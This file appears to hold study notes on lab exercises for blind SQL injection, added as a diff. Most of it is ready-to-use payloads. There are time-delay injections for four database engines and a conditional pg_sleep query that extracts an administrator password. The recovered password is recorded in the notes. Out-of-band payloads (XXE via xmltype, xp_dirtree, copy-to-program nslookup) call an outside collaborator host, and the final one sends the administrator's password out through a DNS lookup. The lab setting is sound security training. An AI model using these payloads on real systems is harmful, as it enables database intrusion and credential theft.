@@ -1,0 +1,45 @@
+Blind SQL injection with time delays
+vulnerable parameter -> Tracking Id
+End goal 
+-to prove that the field is vulnerable to time based blind sqli
+analysis:
+Oracle 	' || dbms_pipe.receive_message(('a'),10)-- ->x
+Microsoft ' + WAITFOR DELAY '0:0:10'-- ->x
+PostgreSQL 	' || (SELECT pg_sleep(10))-- ->x
+MySQL 	'|| (SELECT sleep(10))-- ->X 
+
+
+Lab: Blind SQL injection with time delays and information retrieval
+vulnerable parameter: tracking Id
+End goal :
+find password for administrator from users table
+' || (select case when (username='administrator' and substring(password,fu,1)='fu') then pg_sleep(10) else pg_sleep(-1) end from users)--
+length -> 20
+rigsy4orwrpnznbxyiai
+
+Lab: Blind SQL injection with out-of-band interaction
+vulnerable parameter -> Tracking Cookies
+
+End goal :
+ Exploit sqli and cause dns look up
+ Analysis:
+ ob30bjyfbqyjmhrzmgdi3nq46vcn0c.burpcollaborator.net
+
+ ' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ob30bjyfbqyjmhrzmgdi3nq46vcn0c.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+  	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://qe8x8b4wbu0tcgvekmmck12pqgw6kv.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+
+ SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')
+Microsoft 	exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
+PostgreSQL 	copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
+MySQL 	The following techniques work on Windows only:
+LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
+SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
+
+Lab: Blind SQL injection with out-of-band data exfiltration
+vulnerable parameter -> Tracking Cookies
+Analysis: burp collaborator:msia8vvelsv27sxe4irp2cgh98fy3n.burpcollaborator.net
+End goal:
+To find password of administrator from tracking cookies using dns lookup
+login as administrator
+'+||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.msia8vvelsv27sxe4irp2cgh98fy3n.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual)--
